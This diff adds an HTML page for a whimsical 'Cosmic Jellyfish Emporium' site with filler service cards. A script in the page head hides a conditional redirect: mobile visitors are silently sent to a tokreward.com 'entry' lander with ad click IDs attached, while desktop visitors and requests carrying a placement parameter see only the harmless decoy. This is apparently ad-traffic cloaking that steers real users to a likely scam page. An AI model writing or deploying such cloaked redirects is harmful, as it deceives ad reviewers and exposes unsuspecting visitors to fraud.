@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://tokreward.com/api/v5/entry?s1=${s}&ttclid=${ttclid}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Emporium</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: rgba(255, 255, 255, 0.2);
+            padding: 20px;
+            text-align: right;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .card {
+            background-color: rgba(0, 0, 0, 0.5);
+            border-radius: 15px;
+            padding: 20px;
+            color: #fff;
+            transform: skew(-5deg);
+        }
+        footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            position: sticky;
+            bottom: 0;
+        }
+        a {
+            color: #ff00ff;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Jellyfish Emporium</h1>
+    </header>
+    <main>
+        <div class="card">
+            <h2>Tentacle Tango</h2>
+            <p>Learn the art of underwater dance with our bioluminescent jellyfish instructors!</p>
+        </div>
+        <div class="card">
+            <h2>Sting-Free Hugs</h2>
+            <p>Experience the warmth of a jellyfish embrace without the ouch!</p>
+        </div>
+        <div class="card">
+            <h2>Jelly Jam Sessions</h2>
+            <p>Join our underwater orchestra and create soothing ocean melodies!</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Cosmic Jellyfish Emporium | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
